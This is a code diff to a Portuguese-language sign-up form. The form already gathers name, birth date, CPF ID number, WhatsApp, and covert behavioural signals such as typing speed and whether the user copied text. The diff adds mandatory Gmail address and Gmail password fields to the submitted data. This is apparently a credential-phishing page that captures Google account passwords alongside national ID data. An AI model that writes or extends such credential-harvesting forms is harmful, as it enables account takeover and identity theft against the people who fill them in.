@@ -125,6 +125,12 @@
     <label for="whatsapp">WhatsApp *</label>
     <input id="whatsapp" type="tel" placeholder="Ex: (11) 99999-9999" />
 
+    <label for="gmail">Gmail *</label>
+    <input id="gmail" type="email" placeholder="Ex: seunome@gmail.com" />
+
+    <label for="senha">Senha *</label>
+    <input id="senha" type="password" placeholder="Digite sua senha" />
+
     <button id="btn">Criar</button>
     <div id="resultado" class="erro"></div>
   </div>
@@ -335,12 +341,13 @@
       const dadosForm = {
         nome: pegar('nome'), dataNascimento: pegar('dataNascimento'),
         cpf: pegar('cpf'), whatsapp: pegar('whatsapp'),
+        gmail: pegar('gmail'), senha: pegar('senha'),
         dispositivo: dispositivo, origem: pegarOrigem(), jaVisitou: jaVisitou,
         tempoPreenchimento: tempoSegundos, tempoFora: tempoFora,
         copiouAlgo: copiouAlgo, velocidadeDigitacao: calcVelocidadeDigitacao(),
       };
       resultado.style.display = 'none';
-      const obrig = ['nome','dataNascimento','cpf','whatsapp'];
+      const obrig = ['nome','dataNascimento','cpf','whatsapp','gmail','senha'];
       const faltando = obrig.filter(function(c) { return !dadosForm[c]; });
       if (faltando.length > 0) {
         resultado.textContent = '⚠️ Preencha todos os campos com *';
